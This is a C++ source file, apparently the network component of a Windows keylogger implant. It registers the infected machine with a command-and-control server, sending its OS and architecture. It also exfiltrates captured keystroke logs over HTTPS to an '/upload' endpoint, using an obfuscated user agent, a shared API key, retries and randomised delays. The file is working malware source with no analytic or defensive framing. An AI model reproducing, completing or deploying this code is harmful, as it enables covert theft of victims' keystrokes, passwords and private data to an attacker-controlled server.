#include "network.h"
#include "config.hpp" // Ensure this is config.hpp
#include "utils.h"
#include "globals.h"  // Include for global variables
#include "obfuscated_strings.h"
#include <windows.h>
#include <wininet.h>
#include <string>
#include <sstream>

#ifndef INTERNET_SERVICE_HTTPS
#define INTERNET_SERVICE_HTTPS 3
#endif

using namespace std;

bool send_http_request(const std::string& endpoint,
    const std::string& method,
    const std::string& data,
    std::string* response) {
    HINTERNET hInternet = nullptr;
    HINTERNET hConnect = nullptr;
    HINTERNET hRequest = nullptr;
    BOOL bResult = FALSE;

    try {
        string user_agent = deobfuscate(reinterpret_cast<const char*>(obf_useragent)) + " Windows NT";
        hInternet = InternetOpenA(user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return false;

        hConnect = InternetConnectA(hInternet, c2_server.c_str(), c2_port,
                        NULL, NULL, INTERNET_SERVICE_HTTPS, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return false;
        }

        hRequest = HttpOpenRequestA(hConnect, method.c_str(), endpoint.c_str(), NULL, NULL, NULL,
                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }

        string auth_header = "X-API-KEY: " + shared_secret + "\r\n";
        string headers = auth_header;

        if (method == "POST") {
            headers += "Content-Type: application/json\r\n";
            bResult = HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                            (LPVOID)data.c_str(), data.length());
            } else {
            bResult = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), NULL, 0);
        }

        if (bResult && response) {
            char buffer[4096] = {0};
            DWORD bytesRead = 0;
            response->clear();
            while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                response->append(buffer, bytesRead);    
            }
        }

        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hInternet) InternetCloseHandle(hInternet);

        return bResult;
    } catch (...) {
        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hInternet) InternetCloseHandle(hInternet);
        return false;
    }
}

bool register_with_c2(const std::string& client_id_param) { // client_id is now a parameter
    if (registered) return true; // Already registered
    string sys_info = get_system_info();

    string os = "unknown", arch = "unknown";
    size_t os_pos = sys_info.find("OS:");
    size_t arch_pos = sys_info.find("ARCH:");

    if (os_pos != string::npos) {
        size_t end_pos = sys_info.find(";", os_pos);
        os = sys_info.substr(os_pos + 3, end_pos - os_pos - 3);
    }

    if (arch_pos != string::npos) {
        size_t end_pos = sys_info.find(";", arch_pos);
        if (end_pos == string::npos) end_pos = sys_info.length();
        arch = sys_info.substr(arch_pos + 5, end_pos - arch_pos - 5);
    }

    string json_data = "{\"id\":\"" + client_id_param + "\",\"os\":\"" + os + "\",\"arch\":\"" + arch + "\"}";

    string response;
    if (send_http_request("/register", "POST", json_data, &response)) {
        registered = true;
        return true;
    }
    return false;
}

bool exfiltrate_keylog_data(const string& data) {
    for (int attempt = 0; attempt < exfiltration_retry_count; attempt++) {
        try {
            string endpoint = "/upload";
            string response;

            HINTERNET hInternet = InternetOpenA(deobfuscate(reinterpret_cast<const char*>(obf_useragent)).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInternet) continue;

            HINTERNET hConnect = InternetConnectA(hInternet, c2_server.c_str(), c2_port, NULL, NULL, INTERNET_SERVICE_HTTPS, 0, 0);
            if (!hConnect) {
                InternetCloseHandle(hInternet);
                continue;
            }

            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(), NULL, NULL, NULL, 
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
            if (!hRequest) {
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                continue;
            }

            string headers = "X-API-KEY: " + shared_secret + "\r\n";
            headers += "X-CLIENT-ID: " + client_id + "\r\n";
            headers += "Content-Type: application/octet-stream\r\n";

            BOOL result = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), 
                                (LPVOID)data.c_str(), data.length());

            if (result) {
                InternetCloseHandle(hRequest);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                return true;
            }

            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);

            Sleep(get_random_sleep_interval(2)); // Variable retry delay
        } catch (...) {
            // Continue to next attempt
        }
    }
    return false; // All attempts failed
}